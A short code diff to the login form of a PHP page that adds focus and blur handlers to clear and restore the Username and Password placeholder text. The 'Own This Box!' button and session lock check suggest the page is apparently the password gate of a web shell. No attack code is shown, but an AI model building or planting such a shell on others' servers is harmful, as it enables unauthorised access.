@@ -490,7 +490,7 @@ if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authentica
             <td>
                 <h1><?php echo $greeting;?></h1><br /><br />
                 <form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
-                <input name="user" value="Username"/> <input name="pass" type="password" value="Password"/> <input class="own" type="Submit" value="Own This Box!"/>
+                <input name="user" value="Username" onfocus="if(this.value == 'Username')this.value = '';" onblur="if(this.value=='')this.value='Username';"/> <input name="pass" type="password" value="Password" onfocus="if(this.value == 'Password')this.value = '';" onblur="if(this.value=='')this.value='Password';"/> <input class="own" type="Submit" value="Own This Box!"/>
                 </form>
             </td>
         </tr>
